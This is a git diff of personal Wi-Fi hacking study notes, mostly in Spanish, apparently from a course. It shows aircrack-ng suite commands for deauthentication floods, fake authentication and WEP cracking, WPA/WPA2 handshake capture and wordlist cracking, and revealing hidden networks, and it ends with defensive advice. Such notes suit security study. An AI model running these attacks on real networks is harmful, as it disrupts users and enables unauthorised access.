@@ -84,7 +84,7 @@ en el directorio principal tendremos varios archivos con la extencion -01 el pri
 que tiene que contener todos los datos enviados desde y hacia la red deve contener urls paswords y users pero esta encriptada
 podemos abrir el archivo .cap en wireshark
 
-Deauthentication Attack:   
+## Deauthentication Attack:   
 Vamos a pretender que somos el cliente cambiando nuestro mac a este y enviar al ruter la señal de desconexion y lo mismo con el cliente  
 ```
 aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0
@@ -122,8 +122,7 @@ aireplay-ng --deauth 0 -a (BSSID) -c (STATION) mon0
 Terminal 4 (deaut from 5GH network)
 aireplay-ng --deauth 0 -a (BSSID) -c (STATION) -D mon0
 ```
-
-WEP Cracking:  
+## WEP Cracking:  
 Initialization Vector (IV) + Key (Wifi Pasword) = Keystream  
 Keystream + Data = Encripted data que se envia al ruter con el IV adjuntado para que el ruter la decodifique  
 Los IV se repetiran porque solo son en 24bits al capturar varios IV repetidos podemos decodificar la Contraseña de la red  
@@ -176,8 +175,7 @@ ifconfig
 ```
 aireplay-ng --fakeauth 30(nos asociamos cada 30 segundos) -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
 ```
-
-WPA / WPA2 Cracking  
+## WPA / WPA2 Cracking  
 solo los handshakes tienen informacion util  
 captura de handshakes:  
 ```
@@ -204,7 +202,23 @@ aircrack-ng (.cap file) -w (worldlist .txt)
 ```
 Hay empresas online donde puedes subir el handshake y ellos te lo analizan
 
-conclucion:  
+## Discovering Hidden Networks
+```
+1. We can see all info runing airdump but not the name
+airodump-ng mon0
+2. (Terminal 1) run airdump agenst that network
+airodump-ng --bssid (BSSID) --channel (Nº) mon0
+3. (Terminal 2) run deautentification atak
+aireplay-ng --deauth -a (BSSID) -c (STATION) mon0
+```
+So, again, the attack is going to be very simple or we're going to do is we're going to do the authentication
+attack for a very short period of time.  
+That's going to disconnect the target device for a split second so they won't even feel it.
+And the operating system will automatically connect back to the network.  
+When it does that, it's going to send the network name in the air and we're sniffing on that channel.
+So we'll be able to capture that name and we'll know the network name.  
+
+## Conclucion:
 no usar wep  
 usar wpa2 con contraseñas complejas  
 asegurar que wps esta desabilitado  
